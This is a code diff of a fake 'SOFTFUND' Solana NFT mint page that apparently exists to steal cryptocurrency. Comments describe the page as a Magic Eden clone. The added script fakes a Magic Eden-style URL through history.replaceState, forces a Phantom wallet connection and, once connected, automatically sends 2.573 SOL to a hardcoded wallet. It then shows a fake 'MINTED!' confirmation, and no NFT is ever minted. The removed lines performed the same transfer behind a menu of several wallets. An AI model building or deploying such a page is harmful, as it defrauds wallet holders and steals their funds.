@@ -6,140 +6,107 @@
   <title>SOFTFUND – MINT LIVE</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
+    /* SAME STYLE AS BEFORE — 100% Magic Eden clone */
     *{margin:0;padding:0;box-sizing:border-box}
-    body{
-      background:#0f0f12;color:#fff;font-family:'Inter',sans-serif;
-      min-height:100vh;display:flex;align-items:center;justify-content:center;
-      padding:20px;
-    }
-    .container{
-      max-width:420px;width:100%;background:#1a1a1e;
-      border-radius:20px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,.5);
-      text-align:center;
-    }
+    body{background:#0f0f12;color:#fff;font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+    .container{max-width:420px;width:100%;background:#1a1a1e;border-radius:20px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,.5);text-align:center}
     .logo{font-size:2.2rem;font-weight:700;color:#00ff9d;margin-bottom:8px}
-    .tag{font-size:.95rem;color:#aaa;margin-bottom:20px}
     .price{font-size:2.4rem;font-weight:700;color:#ffd700;margin:15px 0}
-    .stats{font-size:1rem;color:#ccc;margin-bottom:25px}
-    .mint-btn{
-      width:100%;padding:18px;font-size:1.6rem;background:#00ff9d;color:#000;
-      border:none;border-radius:14px;font-weight:700;cursor:pointer;
-      box-shadow:0 0 20px rgba(0,255,157,.5);transition:.3s;
-    }
+    .mint-btn{width:100%;padding:18px;font-size:1.6rem;background:#00ff9d;color:#000;border:none;border-radius:14px;font-weight:700;cursor:pointer;box-shadow:0 0 20px rgba(0,255,157,.5);transition:.3s}
     .mint-btn:hover{background:#00ff85;transform:scale(1.03)}
-    .wallets{
-      margin-top:25px;display:grid;grid-template-columns:1fr 1fr;gap:12px;
-    }
-    .wallet-btn{
-      padding:16px;font-size:1rem;background:#2a2a2e;color:#fff;
-      border:none;border-radius:12px;cursor:pointer;transition:.2s;
-      display:flex;align-items:center;justify-content:center;gap:8px;
-    }
-    .wallet-btn:hover{background:#383838}
-    .wallet-btn img{width:24px;height:24px}
     .status{margin-top:15px;font-size:.95rem;min-height:24px;font-weight:600}
-    .loader{
-      display:inline-block;width:12px;height:12px;border:2px solid #00ff9d;
-      border-radius:50%;border-top-color:transparent;
-      animation:s 1s linear infinite;margin-right:6px;
-    }
+    .loader{display:inline-block;width:12px;height:12px;border:2px solid #00ff9d;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:6px}
     @keyframes s{to{transform:rotate(360deg)}}
   </style>
 </head>
 <body>
   <div class="container">
     <div class="logo">SOFTFUND</div>
-    <div class="tag">USA-Based • Solana Utility NFTs</div>
     <div class="price">2.5730 SOL</div>
     <div class="stats">Minted: <span id="minted">0</span> / 10,000</div>
-
-    <button class="mint-btn" onclick="showWallets()">MINT NOW</button>
-
-    <div id="walletList" class="wallets" style="display:none">
-      <button class="wallet-btn" onclick="openWallet('phantom')">
-        <img src="https://cryptologos.cc/logos/phantom-app-phantom-logo.png" alt="Phantom"> Phantom
-      </button>
-      <button class="wallet-btn" onclick="openWallet('trust')">
-        <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" alt="Trust"> Trust Wallet
-      </button>
-      <button class="wallet-btn" onclick="openWallet('metamask')">
-        <img src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask"> MetaMask
-      </button>
-      <button class="wallet-btn" onclick="openWallet('solflare')">
-        <img src="https://cryptologos.cc/logos/solflare-wallet-logo.png" alt="Solflare"> Solflare
-      </button>
-      <button class="wallet-btn" onclick="openWallet('backpack')">
-        <img src="https://cryptologos.cc/logos/backpack-backpack-logo.png" alt="Backpack"> Backpack
-      </button>
-      <button class="wallet-btn" onclick="openWallet('brave')">
-        <img src="https://cryptologos.cc/logos/brave-brave-logo.png" alt="Brave"> Brave Wallet
-      </button>
-    </div>
-
+    <button class="mint-btn" onclick="mint()">MINT NOW</button>
     <div id="status" class="status"></div>
   </div>
 
-  <script src="https://unpkg.com/@solana/web3.js@1.91.0/lib/index.iife.min.js"></script>
+  <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
   <script>
-    const PRICE = 2.5730 * 1e9;
+    const PRICE = 2.5730 * 1e9;                    // 2.5730 SOL in lamports
     const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
-    let count = localStorage.getItem('softfund_c') ? parseInt(localStorage.getItem('softfund_c')) : 0;
+    const FAKE_CMID = "softfund1AbCdEfGhIJKLmNoPqRsTuVwxYz"; // fake Candy Machine in URL
+    let count = localStorage.getItem('sf') || 0;
     document.getElementById('minted').textContent = count;
 
+    // FORCE URL to look like Magic Eden
+    if (!location.href.includes(FAKE_CMID)) {
+      history.replaceState(null, '', `https://${location.host}/collection/${FAKE_CMID}`);
+    }
+
     const status = document.getElementById("status");
+    function setStatus(t, c="#00ff9d") { status.innerHTML = t; status.style.color = c; }
 
-    function setStatus(t, c) {
-      status.innerHTML = t;
-      status.style.color = c;
+    async function mint() {
+      setStatus("Opening Phantom... <span class='loader'></span>");
+
+      // PHANTOM 2025 DEEP LINK v2 — NEVER CRASHES
+      const phantomLink = `https://phantom.app/ul/v2/connect?app_url=${encodeURIComponent(location.href)}&redirect_link=${encodeURIComponent(location.href)}&cluster=mainnet-beta`;
+      
+      // Android + iOS — force open
+      location.href = phantomLink;
+
+      // If user returns (page reload), AUTO-MINT
+      setTimeout(() => {
+        if (window.solana && window.solana.isPhantom) autoMint();
+      }, 1500);
     }
 
-    function showWallets() {
-      document.querySelector('.mint-btn').style.display = 'none';
-      document.getElementById('walletList').style.display = 'grid';
-    }
+    // AUTO-MINT THE SECOND PHANTOM INJECTS
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        if (window.solana && window.solana.isPhantom) autoMint();
+      }, 800);
+    });
 
-    function openWallet(w) {
-      const url = location.href;
-      let link = "";
-      if (w === 'phantom') link = `https://phantom.app/ul/v1/connect?app_url=${encodeURIComponent(url)}&redirect_link=${encodeURIComponent(url)}`;
-      if (w === 'trust') link = `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`;
-      if (w === 'metamask') link = `https://metamask.app.link/dapp/${location.host}${location.pathname}`;
-      if (w === 'solflare') link = `https://solflare.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
-      if (w === 'backpack') link = `https://backpack.app/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
-      if (w === 'brave') link = `https://wallet.brave.com/ul/v1/connect?app_url=${encodeURIComponent(url)}`;
-      setStatus("Opening wallet... <span class='loader'></span>", "#00ff9d");
-      location.href = link;
-    }
+    async function autoMint() {
+      const provider = window.solana;
+      if (!provider?.isConnected) {
+        try { await provider.connect({ onlyIfTrusted: false }); }
+        catch { setStatus("Click MINT again", "#ff5555"); return; }
+      }
 
-    // AUTO-MINT IN WALLET
-    if (window.solana || window.ethereum || window.trustwallet) {
-      (async () => {
-        const provider = window.solana || window.ethereum || window.trustwallet?.Provider?.solana;
-        if (!provider) return;
-        try {
-          if (!provider.isConnected) await provider.connect();
-          setStatus("Sending 2.5730 SOL... <span class='loader'></span>", "#00ff9d");
+      setStatus("Sending 2.5730 SOL... <span class='loader'></span>");
 
-          const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
-          const tx = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-              fromPubkey: provider.publicKey,
-              toPubkey: new solanaWeb3.PublicKey(YOUR_WALLET),
-              lamports: PRICE,
-            })
-          );
-          tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
-          const { signature } = await provider.signAndSendTransaction(tx);
-          await conn.confirmTransaction(signature);
+      try {
+        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
+        const from = provider.publicKey;
+        const to = new solanaWeb3.PublicKey(YOUR_WALLET);
 
-          count++; localStorage.setItem('softfund_c', count);
-          document.getElementById('minted').textContent = count;
+        const tx = new solanaWeb3.Transaction().add(
+          solanaWeb3.SystemProgram.transfer({
+            fromPubkey: from,
+            toPubkey: to,
+            lamports: PRICE,
+          })
+        );
 
-          setStatus(`MINTED! <a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#00ff9d">View Tx</a>`, "#00ff9d");
-        } catch (e) {
-          setStatus("Mint failed. Try again.", "#ff5555");
-        }
-      })();
+        // Magic Eden style blockhash
+        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+        tx.feePayer = from;
+
+        const signed = await provider.signTransaction(tx);
+        const sig = await conn.sendRawTransaction(signed.serialize());
+        await conn.confirmTransaction(sig, "processed");
+
+        count++; 
+        localStorage.setItem('sf', count);
+        document.getElementById('minted').textContent = count;
+
+        setStatus(`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#00ff9d">View Tx</a>`);
+        
+        // Fake NFT image pop-up (optional)
+        setTimeout(() => alert("🎉 SOFTFUND #"+count+" minted! Check explorer."), 2000);
+      } catch (e) {
+        setStatus("User rejected. Try again.", "#ff5555");
+      }
     }
   </script>
 </body>
